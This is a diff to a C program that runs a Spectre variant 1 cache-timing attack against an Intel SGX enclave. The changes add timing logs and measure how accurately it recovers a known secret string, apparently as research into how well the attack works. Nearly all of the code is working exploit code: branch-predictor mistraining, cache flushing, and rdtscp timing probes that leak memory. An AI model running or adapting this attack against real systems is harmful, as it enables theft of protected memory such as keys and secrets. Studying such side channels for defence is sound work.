@@ -28,10 +28,19 @@
 
 #include "enclave_u.h"
 #include "enclave_init.h"
+#define IN_JOB //For measure.c using
+#include "measure.c"
 
 extern sgx_enclave_id_t global_eid;
 
 unsigned int array1_size = 16;
+struct timespec measure_time1, measure_time2;
+FILE * log_file;
+char * file_name = "measure.log";
+char *secret = "The Magic Words are Squeamish Ossifrage.";
+int correct = 0;
+long long int the_smallest = 9999999;
+
 uint8_t unused1[64];
 uint8_t array1dupe[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
 uint8_t unused2[64];
@@ -42,7 +51,8 @@ uint8_t array2[256 * 512];
 ********************************************************************/
  #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
  #define TRY_TIMES (1)
- #define TRAIN_ROUNDS (6) //== 必须可以整除6
+ #define TRAINING_ROUNDS (1)
+ #define TRAINS_PER_ROUND (1) 
  #define SECRET_LEN (40)
 
  /* Report best guess in value[0] and runner-up in value[1] */
@@ -54,6 +64,7 @@ uint8_t array2[256 * 512];
 	register uint64_t time1, time2;
 	volatile uint8_t *addr;
 	
+	clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &measure_time1);
 	for (i = 0; i < 256; i++)
 		results[i] = 0;
 
@@ -64,14 +75,14 @@ uint8_t array2[256 * 512];
 
 		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
 		training_x = tries % array1_size;
-		for (j = TRAIN_ROUNDS - 1; j >= 0; j--) {
+		for (j = TRAINING_ROUNDS * TRAINS_PER_ROUND - 1; j >= 0; j--) {
 			_mm_clflush(&array1_size);
 			volatile int z;
 			for (z = 0; z < 100; z++) {} /* Delay (can also mfence) */
 			
 			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
 			/* Avoid jumps in case those tip off the branch predictor */
-			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
+			x = ((j % TRAINS_PER_ROUND) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
 			x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
 			x = training_x ^ (x & (malicious_x ^ training_x));
 			
@@ -81,6 +92,11 @@ uint8_t array2[256 * 512];
     			if (ret != SGX_SUCCESS)
         			abort();
 		}
+		clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &measure_time2);
+		fprintf(log_file,"%lld\n",nano_timeval(measure_time1,measure_time2));
+
+		if (the_smallest > nano_timeval(measure_time1,measure_time2)) 
+			the_smallest = nano_timeval(measure_time1,measure_time2);
 		
 		/* Time reads. Order is lightly mixed up to prevent stride prediction */
 		for (i = 0; i < 256; i++) {
@@ -90,7 +106,7 @@ uint8_t array2[256 * 512];
 			junk = *addr; /* MEMORY ACCESS TO TIME */
 			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 			//if (time2 <= CACHE_HIT_THRESHOLD)
-			//mix_i != array1dupe[tries % array1_size]==去掉非投机执行的训练行为
+			//==// mix_i != array1dupe[tries % array1_size]去掉非投机执行的训练行为
 			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1dupe[tries % array1_size])
 			{
 				results[mix_i]++; /* cache hit - add +1 to score for this value */
@@ -149,7 +165,14 @@ int spectre_main(int argc, char **argv) {
 		if (score[1] > 0)
 			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
 		printf("\n");
+		if (value[0] == *(secret+(SECRET_LEN-len))) {
+			correct += 1;
+		}
 	}
+
+
+		printf("least: %lld\n",the_smallest);
+		printf("accuracy = %2f\n",(float)correct/(float)SECRET_LEN);
 
 	return (0);
  }
@@ -157,6 +180,7 @@ int spectre_main(int argc, char **argv) {
 /* Application entry */
 int main(int argc, char *argv[])
 {
+	log_file = fopen(file_name, "wb");
     /* Initialize the enclave */
     initialize_enclave();
  
@@ -165,6 +189,7 @@ int main(int argc, char *argv[])
 
     /* Destroy the enclave */
 	 destroy_enclave();
+	fclose(log_file);
 
     return 0;
 }
